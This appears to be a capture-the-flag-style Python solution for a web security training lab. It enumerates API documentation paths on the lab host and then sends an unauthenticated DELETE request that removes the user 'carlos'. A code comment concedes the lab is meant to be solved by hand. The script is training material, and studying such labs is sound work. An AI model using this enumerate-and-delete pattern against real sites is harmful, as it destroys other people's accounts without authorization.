import requests

requests.packages.urllib3.disable_warnings()


'''

Coded by Kamran Saifullah
https://linkedin.com/in/KamranSaifullah
https://twitter.com/deFr0ggy
https://github.com/deFr0ggy

'''

proxxy = {

    "http" : "http://127.0.0.1:8080",
    "https" : "http://127.0.0.1:8080"

}

data = {}

URL = "https://0a0e00330450531d81c8086e00250064.web-security-academy.net"

API_Endpoints = ["/api", "/api/v1", "/api/v2"]

r = requests.get(URL, verify=False)

try:
    if r.status_code == 200:

        print(f"[+] URL is accessible with Default POST Data: {URL}")

        for endpoints in API_Endpoints:
            r = requests.get(URL+endpoints, verify=False)
            if r.status_code == 200:
                print(f"[+] API Documentation available at: {URL+endpoints}")
                print(f"[+] Deleting Carlos User: DELETE /api/user/carlos")
                r = requests.delete(URL+"/api/user/carlos", data=data, verify=False)
                # This lab has to be done manually, the code assumes having access to the API and works.
                if "Congratulations" in  r.text:
                    print(f"[+] Carlos User Has Been Deleted")
                    print(f"[-] Lab completed")

except:
    print("Something went wrong!")

